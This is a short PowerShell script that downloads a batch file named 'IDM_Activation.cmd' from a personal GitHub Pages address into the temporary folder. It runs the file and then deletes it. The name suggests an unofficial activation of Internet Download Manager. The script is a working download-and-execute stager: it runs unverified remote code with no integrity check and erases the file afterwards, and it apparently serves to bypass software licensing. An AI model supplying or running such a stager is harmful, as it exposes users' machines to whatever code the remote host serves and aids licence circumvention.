# Enable TLSv1.2 for compatibility with older clients
if (-not ([System.Net.ServicePointManager]::SecurityProtocol -band [System.Net.SecurityProtocolType]::Tls12)) {
    [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor [System.Net.SecurityProtocolType]::Tls12
}

$DownloadURL = 'https://sadmanadib33.github.io/IDM_Activation_hawkeye/IDM_Activation.cmd'

# Define the temporary file path
$FilePath = Join-Path $env:TEMP 'IDMA.cmd'

try {
    # Download the file
    Invoke-WebRequest -Uri $DownloadURL -UseBasicParsing -OutFile $FilePath
} catch {
    # If an error occurs, log it and stop execution
    Write-Error "Failed to download the file from $DownloadURL. Error: $_"
    return
}

# Check if the file was downloaded successfully
if (Test-Path -Path $FilePath) {
    try {
        # Start the process and wait for it to complete
        Start-Process -FilePath $FilePath -Wait -NoNewWindow
    } catch {
        # Handle any errors while starting the process
        Write-Error "Failed to start the process for $FilePath. Error: $_"
        return
    }

    # Remove the downloaded file
    try {
        Remove-Item -Path $FilePath -Force
    } catch {
        Write-Error "Failed to delete the file $FilePath. Error: $_"
    }
} else {
    Write-Error "The file $FilePath does not exist."
}
